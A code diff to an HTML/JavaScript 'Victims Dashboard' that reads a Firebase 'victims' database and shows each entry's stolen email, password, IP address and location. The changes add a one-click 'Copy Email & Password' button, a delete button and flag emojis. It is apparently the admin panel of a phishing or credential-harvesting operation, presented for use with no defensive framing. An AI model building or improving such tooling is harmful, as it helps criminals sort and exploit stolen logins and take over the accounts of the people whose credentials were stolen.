@@ -1,13 +1,33 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Victims Dashboard</title>
+    <title>📋 Victims Dashboard</title>
     <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database.js"></script>
     <style>
-        body { font-family: Arial; background: #f2f2f2; }
-        .card { background: white; padding: 15px; margin: 15px; border-radius: 10px; box-shadow: 0 0 5px rgba(0,0,0,0.1); }
-        .flag { height: 20px; vertical-align: middle; }
+        body { font-family: Arial, sans-serif; background: #f2f2f2; padding: 20px; }
+        h2 { text-align: center; }
+        .card { background: white; padding: 15px; margin: 15px auto; border-radius: 10px; box-shadow: 0 0 5px rgba(0,0,0,0.1); max-width: 600px; position: relative; }
+        .flag-emoji { font-size: 24px; vertical-align: middle; }
+        button.copy-btn, button.delete-btn {
+            position: absolute;
+            top: 15px;
+            padding: 5px 10px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            color: white;
+            font-weight: bold;
+            font-size: 12px;
+        }
+        button.copy-btn {
+            right: 60px;
+            background-color: #4CAF50;
+        }
+        button.delete-btn {
+            right: 15px;
+            background-color: #f44336;
+        }
     </style>
 </head>
 <body>
@@ -15,6 +35,7 @@
     <div id="victimsList"></div>
 
     <script>
+        // Your Firebase config here:
         const firebaseConfig = {
             apiKey: "YOUR_API_KEY",
             authDomain: "YOUR_PROJECT.firebaseapp.com",
@@ -27,29 +48,72 @@
         const app = firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
 
-        db.ref('victims').on('value', (snapshot) => {
-            const data = snapshot.val();
+        // Helper to copy text to clipboard
+        function copyText(text) {
+            navigator.clipboard.writeText(text)
+                .then(() => alert('Copied to clipboard!'))
+                .catch(() => alert('Failed to copy.'));
+        }
+
+        // Convert country code to emoji flag
+        function countryCodeToEmoji(code) {
+            if (!code) return '';
+            return code.toUpperCase().replace(/./g, char =>
+                String.fromCodePoint(127397 + char.charCodeAt())
+            );
+        }
+
+        function renderVictims(data) {
             let output = "";
 
             for (let id in data) {
                 let v = data[id];
+                const flagEmoji = v.flag || (v.countryCode ? countryCodeToEmoji(v.countryCode) : '');
+
                 output += `
-                    <div class="card">
+                    <div class="card" data-id="${id}">
+                        <button class="copy-btn" title="Copy Email & Password">📋 Copy</button>
+                        <button class="delete-btn" title="Delete Entry">🗑️ Delete</button>
+
                         📧 <b>Email:</b> ${v.email || ''} <br>
                         🔑 <b>Password:</b> ${v.password || ''} <br>
                         🌐 <b>IP:</b> ${v.ip || ''} <br>
-                        📍 <b>Location:</b> ${v.country || ''} <img class="flag" src="${v.flag || ''}"> <br>
-                        🕒 <b>Time:</b> ${v.time || ''} — ${v.date || ''} <br><br>
+                        📍 <b>Location:</b> ${v.country || ''} <span class="flag-emoji">${flagEmoji}</span> <br>
+                        🕒 <b>Time:</b> ${v.timestamp || v.time || ''} <br><br>
+
                         <hr>
                         <b>Other Details:</b><br>
                         ${Object.entries(v)
-                            .filter(([k]) => !['email','password','ip','country','flag','time','date'].includes(k))
+                            .filter(([k]) => !['email','password','ip','country','flag','timestamp','time','countryCode'].includes(k))
                             .map(([key,value]) => `<b>${key}:</b> ${value}<br>`).join('')}
                     </div>
                 `;
             }
-
             document.getElementById('victimsList').innerHTML = output;
+
+            // Attach event listeners after rendering:
+            document.querySelectorAll('.card').forEach(card => {
+                const id = card.getAttribute('data-id');
+                const victimData = data[id];
+
+                card.querySelector('.copy-btn').onclick = () => {
+                    const textToCopy = `Email: ${victimData.email || ''}\nPassword: ${victimData.password || ''}`;
+                    copyText(textToCopy);
+                };
+
+                card.querySelector('.delete-btn').onclick = () => {
+                    if (confirm('Delete this entry?')) {
+                        db.ref('victims/' + id).remove()
+                            .then(() => alert('Entry deleted'))
+                            .catch(err => alert('Delete failed: ' + err.message));
+                    }
+                };
+            });
+        }
+
+        db.ref('victims').on('value', snapshot => {
+            const data = snapshot.val() || {};
+            renderVictims(data);
         });
     </script>
 </body>
